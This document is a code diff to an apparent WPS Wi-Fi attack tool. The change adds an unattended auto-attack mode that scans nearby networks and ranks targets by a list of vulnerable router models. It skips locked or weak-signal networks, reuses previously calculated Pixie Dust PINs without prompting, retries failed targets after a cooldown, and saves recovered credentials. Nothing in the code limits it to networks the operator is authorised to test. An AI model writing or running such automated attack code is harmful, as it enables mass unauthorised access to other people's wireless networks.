@@ -734,7 +734,7 @@ class Companion:
         return False
 
     def single_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, showpixiecmd=False,
-                          pixieforce=False, store_pin_on_fail=False):
+                          pixieforce=False, store_pin_on_fail=False, auto_mode=False):
         if not pin:
             if pixiemode:
                 try:
@@ -742,7 +742,11 @@ class Companion:
                     filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
                     with open(filename, 'r') as file:
                         t_pin = file.readline().strip()
-                        if input('[?] Use previously calculated PIN {}? [n/Y] '.format(t_pin)).lower() != 'n':
+                        # Skip prompt in auto mode
+                        if auto_mode:
+                            pin = t_pin
+                            print(f'[i] Using previously calculated PIN: {t_pin}')
+                        elif input('[?] Use previously calculated PIN {}? [n/Y] '.format(t_pin)).lower() != 'n':
                             pin = t_pin
                         else:
                             raise FileNotFoundError
@@ -900,26 +904,30 @@ class Companion:
 
 class WiFiScanner:
     """docstring for WiFiScanner"""
-    def __init__(self, interface, vuln_list=None):
+    def __init__(self, interface, vuln_list=None, stored_networks=None):
         self.interface = interface
         self.vuln_list = vuln_list
 
-        reports_fname = os.path.dirname(os.path.realpath(__file__)) + '/reports/stored.csv'
-        try:
-            with open(reports_fname, 'r', newline='', encoding='utf-8', errors='replace') as file:
-                csvReader = csv.reader(file, delimiter=';', quoting=csv.QUOTE_ALL)
-                # Skip header
-                next(csvReader)
-                self.stored = []
-                for row in csvReader:
-                    self.stored.append(
-                        (
-                            row[1],   # BSSID
-                            row[2]    # ESSID
+        # Use provided stored_networks if available, otherwise load from file
+        if stored_networks is not None:
+            self.stored = [(bssid, '') for bssid in stored_networks]  # Convert set to list of tuples
+        else:
+            reports_fname = os.path.dirname(os.path.realpath(__file__)) + '/reports/stored.csv'
+            try:
+                with open(reports_fname, 'r', newline='', encoding='utf-8', errors='replace') as file:
+                    csvReader = csv.reader(file, delimiter=';', quoting=csv.QUOTE_ALL)
+                    # Skip header
+                    next(csvReader)
+                    self.stored = []
+                    for row in csvReader:
+                        self.stored.append(
+                            (
+                                row[1],   # BSSID
+                                row[2]    # ESSID
+                            )
                         )
-                    )
-        except FileNotFoundError:
-            self.stored = []
+            except FileNotFoundError:
+                self.stored = []
 
     def iw_scanner(self) -> Dict[int, dict]:
         """Parsing iw scan results"""
@@ -1020,6 +1028,10 @@ class WiFiScanner:
         # Sorting by signal level
         networks.sort(key=lambda x: x['Level'], reverse=True)
 
+        # Cache model strings to avoid repeated string formatting
+        for network in networks:
+            network['model_string'] = '{} {}'.format(network['Model'], network['Model number'])
+
         # Putting a list of networks in a dictionary, where each key is a network number in list of networks
         network_list = {(i + 1): network for i, network in enumerate(networks)}
 
@@ -1118,7 +1130,7 @@ class WiFiScanner:
             network_list_items = network_list_items[::-1]
         for n, network in network_list_items:
             number = f'{n})'
-            model = '{} {}'.format(network['Model'], network['Model number'])
+            model = network['model_string']  # Use cached model string
             essid = truncateStr(network.get('ESSID', 'HIDDEN'), 25)
             deviceName = truncateStr(network['Device name'], 27)
     
@@ -1173,6 +1185,10 @@ class WiFiScanner:
 def auto_attack_mode(args):
     """Handles the auto-attack logic."""
     stored_networks = set()
+    failed_networks = {}  # {bssid: (timestamp, retry_count)}
+    FAIL_COOLDOWN = 300  # 5 minutes cooldown after failed attempt
+    MAX_RETRIES = 3  # Max retries before permanent skip
+
     try:
         with open(os.path.dirname(os.path.realpath(__file__)) + '/reports/stored.csv', 'r', newline='', encoding='utf-8', errors='replace') as file:
             csvReader = csv.reader(file, delimiter=';', quoting=csv.QUOTE_ALL)
@@ -1182,15 +1198,20 @@ def auto_attack_mode(args):
     except FileNotFoundError:
         pass
 
+    # Read vuln_list once before the loop
+    try:
+        with open(args.vuln_list, 'r', encoding='utf-8') as file:
+            vuln_list = file.read().splitlines()
+    except FileNotFoundError:
+        vuln_list = []
+
+    # Create Companion instance once and reuse it
+    companion = None
+
     while True:
         try:
             print("[*] Scanning for networks...")
-            try:
-                with open(args.vuln_list, 'r', encoding='utf-8') as file:
-                    vuln_list = file.read().splitlines()
-            except FileNotFoundError:
-                vuln_list = []
-            scanner = WiFiScanner(args.interface, vuln_list)
+            scanner = WiFiScanner(args.interface, vuln_list, stored_networks)
             networks = scanner.iw_scanner()
 
             if not networks:
@@ -1201,15 +1222,33 @@ def auto_attack_mode(args):
             # Prioritize networks: green, then white
             green_targets = []
             white_targets = []
+            current_time = time.time()
 
             for _, network in networks.items():
-                model = '{} {}'.format(network['Model'], network['Model number'])
-                if network['BSSID'] in stored_networks:
+                bssid = network['BSSID']
+                model = network.get('model_string', '')  # Use cached model string
+
+                # Skip already stored networks
+                if bssid in stored_networks:
                     continue
+
+                # Skip locked networks
                 if network['WPS locked']:
                     continue
 
-                target_info = {'bssid': network['BSSID'], 'essid': network.get('ESSID', 'HIDDEN')}
+                # Skip weak signal networks
+                if network.get('Level', -100) < args.min_signal:
+                    continue
+
+                # Check failed network cooldown
+                if bssid in failed_networks:
+                    fail_time, retry_count = failed_networks[bssid]
+                    if retry_count >= MAX_RETRIES:
+                        continue  # Permanently skip after max retries
+                    if current_time - fail_time < FAIL_COOLDOWN:
+                        continue  # Still in cooldown period
+
+                target_info = {'bssid': bssid, 'essid': network.get('ESSID', 'HIDDEN')}
 
                 if model in vuln_list:
                     green_targets.append(target_info)
@@ -1226,13 +1265,36 @@ def auto_attack_mode(args):
             # Attack only the first target, then rescan
             target = prioritized_targets[0]
             print(f"[*] Attacking {target['essid']} ({target['bssid']})")
-            companion = Companion(args.interface, args.write, print_debug=args.verbose, bssid=target['bssid'], save_location=args.location, attempt_timeout=args.attempt_time)
-            if companion.single_connection(bssid=target['bssid'], pixiemode=True, showpixiecmd=args.show_pixie_cmd, pixieforce=args.pixie_force):
-                print(f"[+] Successfully attacked {target['essid']}. Credentials saved.")
-                stored_networks.add(target['bssid'])
-            else:
-                print(f"[-] Attack on {target['essid']} failed.")
-            # companion.cleanup()
+
+            # Create Companion if it doesn't exist or recreate if there was an error
+            if companion is None:
+                companion = Companion(args.interface, args.write, print_debug=args.verbose, bssid=target['bssid'], save_location=args.location, attempt_timeout=args.attempt_time)
+
+            try:
+                if companion.single_connection(bssid=target['bssid'], pixiemode=True, showpixiecmd=args.show_pixie_cmd, pixieforce=args.pixie_force, auto_mode=True):
+                    print(f"[+] Successfully attacked {target['essid']}. Credentials saved.")
+                    stored_networks.add(target['bssid'])
+                    # Remove from failed list if it was there
+                    failed_networks.pop(target['bssid'], None)
+                else:
+                    print(f"[-] Attack on {target['essid']} failed.")
+                    # Track failed attempt
+                    if target['bssid'] in failed_networks:
+                        _, retry_count = failed_networks[target['bssid']]
+                        failed_networks[target['bssid']] = (current_time, retry_count + 1)
+                        print(f"[i] Retry count for {target['bssid']}: {retry_count + 1}/{MAX_RETRIES}")
+                    else:
+                        failed_networks[target['bssid']] = (current_time, 1)
+                        print(f"[i] Added to failed list. Will retry after {FAIL_COOLDOWN}s cooldown.")
+            except Exception as e:
+                print(f"[!] Error during attack: {e}. Recreating Companion instance...")
+                # Cleanup failed instance and recreate on next iteration
+                try:
+                    companion.cleanup()
+                except:
+                    pass
+                companion = None
+
             time.sleep(1) # Brief pause before rescanning
 
         except KeyboardInterrupt:
@@ -1241,6 +1303,13 @@ def auto_attack_mode(args):
         except Exception as e:
             print(f"[!] An error occurred: {e}. Retrying...")
             time.sleep(10)
+
+    # Final cleanup
+    if companion is not None:
+        try:
+            companion.cleanup()
+        except:
+            pass
 
 def get_gps_location():
     """
@@ -1437,6 +1506,12 @@ if __name__ == '__main__':
         type=float,
         default=30.0,
         help='Set the timeout for each connection attempt in seconds [30.0]'
+    )
+    parser.add_argument(
+        '--min-signal',
+        type=int,
+        default=-100,
+        help='Minimum signal strength (dBm) to attack a network. Default: -100 (no filtering)'
     )
     parser.add_argument(
         '--mtk-wifi',
